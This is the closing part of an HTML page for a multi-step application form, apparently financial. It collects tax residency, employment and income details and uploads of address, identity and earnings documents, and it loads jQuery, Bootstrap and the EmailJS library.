                <h2><span class="form-two-title">Tax information</span></h2>
                <p class="sub-title">
                  In what countries are you a tax resident? We need to know this
                  so we can report correctly to the tax office.
                </p>
                <div class="form-group">
                  <div class="ratio-option">
                    <input
                      type="radio"
                      checked
                      name="tex"
                      id="in-uk"
                      value="Only in UK"
                    />
                    <label for="in-uk">Only in the UK</label>
                  </div>
                  <div class="ratio-option">
                    <input
                      type="radio"
                      name="tex"
                      id="in-abroad"
                      value="Only abroad"
                    />
                    <label for="in-abroad">Only abroad</label>
                  </div>
                  <div class="ratio-option">
                    <input
                      type="radio"
                      name="tex"
                      id="in-both"
                      value="In UK and abroad"
                    />
                    <label for="in-both">In the UK and abroad</label>
                  </div>
                </div>
                <h2><span class="form-two-title">Employment</span></h2>
                <p class="sub-title">
                  We need to know some details about your employment situation
                  for fraud prevention.
                </p>
                <div class="form-group">
                  <label for="employment-status" class="m-15"
                    >Employment Status</label
                  >
                  <select
                    class="input-text w-100 select-field"
                    id="employment-status"
                  >
                    <option value="select">Select an employment status</option>
                    <option value="Employed">Employed</option>
                    <option value="Self Employed">Self Employed</option>
                    <option value="Retired">Retired</option>
                    <option value="Student">Student</option>
                    <option value="Unemployed">Unemployed</option>
                    <option value="Other">Other</option>
                  </select>
                  <span class="error" id="error-employment"></span>
                </div>
                <div class="form-group">
                  <label for="annual-income" class="m-15">Annual income</label>
                  <select
                    class="input-text w-100 select-field"
                    id="annual-income"
                  >
                    <option value="select">Select annual income</option>
                    <option value="£0 - £25,000">£0 - £25,000</option>
                    <option value="£25,000 - £50,000">£25,000 - £50,000</option>
                    <option value="£50,000 - £100,00">£50,000 - £100,00</option>
                    <option value="£100,000 +">£100,000 +</option>
                  </select>
                  <span class="error" id="error-annual"></span>
                </div>

                <div class="form-group">
                  <label for="employer" class="m-15">Employer Name</label>
                  <input
                    type="text"
                    class="form-control input-text employer"
                    id="employer"
                    name="employer"
                    placeholder="Enter Name"
                  />
                  <span class="error" id="error-employer"></span>
                </div>

                <div class="form-group">
                  <label for="occupation" class="m-15">Occupation</label>
                  <input
                    type="text"
                    class="form-control input-text occupation"
                    id="occupation"
                    name="occupation"
                    placeholder="Enter Here"
                  />
                  <span class="error" id="error-occupation"></span>
                </div>

                <div class="form-submit">
                  <button type="button" id="third-submit" class="next-btn">
                    Next
                  </button>
                </div>
              </div>
            </div>

            <div id="form-contents-4" class="width-4">
              <div class="form-items">
                <div class="form-group">
                  <h1>
                    <span class="form-two-title mt-none">Proof of Address</span>
                  </h1>
                  <p class="sub-title text-center">
                    Please upload the relevant documentation
                  </p>
                  <label for="investment-amount" class="m-15"
                    >Document Type</label
                  >
                  <select
                    class="input-text w-100 select-field"
                    id="investment-term"
                  >
                    <option value="select" selected>
                      Choose Document Type
                    </option>
                    <option value="PDF">PDF</option>
                    <option value="WORD">WORD</option>
                    <option value="PNG">PNG</option>
                  </select>
                  <div
                    class="file-container"
                    onclick="handleFileInputClick('file-input-2', 'selected-file-2')"
                  >
                    <img
                      src="./assets/images/upload.svg"
                      alt="Upload Icon"
                      id="upload-icon-2"
                    />
                    <div class="upload-text">
                      <p class="click-to-upload" id="drag-and-drop-2">
                        Click to Upload
                        <span class="drag-and-drop">or drag and drop</span>
                      </p>
                    </div>
                    <div class="max-file-size">(Max. File size: 25 MB)</div>
                    <input
                      type="file"
                      class="file-input"
                      id="file-input-2"
                      onchange="handleFileChange('file-input-2', 'selected-file-2')"
                    />
                    <div class="selected-file" id="selected-file-2"></div>
                  </div>
                  <span class="error" id="error-investment"></span>
                </div>
                <div class="form-group">
                  <h1><span class="form-two-title">Identification</span></h1>
                  <p class="sub-title text-center">
                    Please upload the relevant documentation
                  </p>
                  <label for="investment-amount" class="m-15"
                    >Document Type</label
                  >
                  <select
                    class="input-text w-100 select-field"
                    id="investment-amount"
                  >
                    <option value="select" selected>
                      Choose Document Type
                    </option>
                    <option value="PDF">PDF</option>
                    <option value="WORD">WORD</option>
                    <option value="PNG">PNG</option>
                  </select>
                  <div
                    class="file-container"
                    onclick="handleFileInputClick('file-input-3', 'selected-file-3')"
                  >
                    <img
                      src="./assets/images/upload.svg"
                      alt="Upload Icon"
                      id="upload-icon-3"
                    />
                    <div class="upload-text">
                      <p class="click-to-upload" id="drag-and-drop-3">
                        Click to Upload
                        <span class="drag-and-drop">or drag and drop</span>
                      </p>
                    </div>
                    <div class="max-file-size">(Max. File size: 25 MB)</div>
                    <input
                      type="file"
                      class="file-input"
                      id="file-input-3"
                      onchange="handleFileChange('file-input-3', 'selected-file-3')"
                    />
                    <div class="selected-file" id="selected-file-3"></div>
                  </div>
                  <span class="error" id="error-amount"></span>
                </div>
                <div class="form-group">
                  <h1><span class="form-two-title">Proof of Earnings</span></h1>
                  <p class="sub-title text-center">
                    Please upload the relevant documentation
                  </p>
                  <label for="source" class="m-15">Document Type</label>
                  <select class="input-text w-100 select-field" id="source">
                    <option value="select" selected>
                      Choose Document Type
                    </option>
                    <option value="PDF">PDF</option>
                    <option value="WORD">WORD</option>
                    <option value="PNG">PNG</option>
                  </select>
                  <div
                    class="file-container"
                    onclick="handleFileInputClick('file-input-4', 'selected-file-4')"
                  >
                    <img
                      src="./assets/images/upload.svg"
                      alt="Upload Icon"
                      id="upload-icon-4"
                    />
                    <div class="upload-text">
                      <p class="click-to-upload" id="drag-and-drop-4">
                        Click to Upload
                        <span class="drag-and-drop">or drag and drop</span>
                      </p>
                    </div>
                    <div class="max-file-size">(Max. File size: 25 MB)</div>
                    <input
                      type="file"
                      class="file-input"
                      id="file-input-4"
                      onchange="handleFileChange('file-input-4', 'selected-file-4')"
                    />
                    <div class="selected-file" id="selected-file-4"></div>
                  </div>
                  <span class="error" id="error-source"></span>
                </div>

                <hr class="form-two--hr number-4" />
                <div class="form-group check-group">
                  <input
                    type="checkbox"
                    value="bank-detail-accept"
                    id="bank-detail-accept"
                    class="checkbox"
                  />
                  <label class="m-15" for="bank-detail-accept"
                    >I confirm that the bank details above are correct</label
                  >
                  <span class="error" id="error-confirm"></span>
                </div>

                <div class="form-submit">
                  <button type="button" id="final-submit" class="next-btn">
                    Apply
                  </button>
                </div>
              </div>
            </div>
          </div>
        </form>
      </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.5.0/js/bootstrap.bundle.min.js"></script>
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
    ></script>

    <script type="text/javascript">
      emailjs.init("hu2g7Zf0InQUe5HuL");
    </script>
    <script src="./assets/js/app.js"></script>
    <script>
      function handleFileInputClick(inputId, selectedFileId) {
        document.getElementById(inputId).click();
      }

      function handleFileChange(inputId, selectedFileId) {
        var input = document.getElementById(inputId);
        var fileName = input.files[0].name;
        document.getElementById(selectedFileId).innerText =
          "Selected file: " + fileName;
      }
    </script>
  </body>
</html>
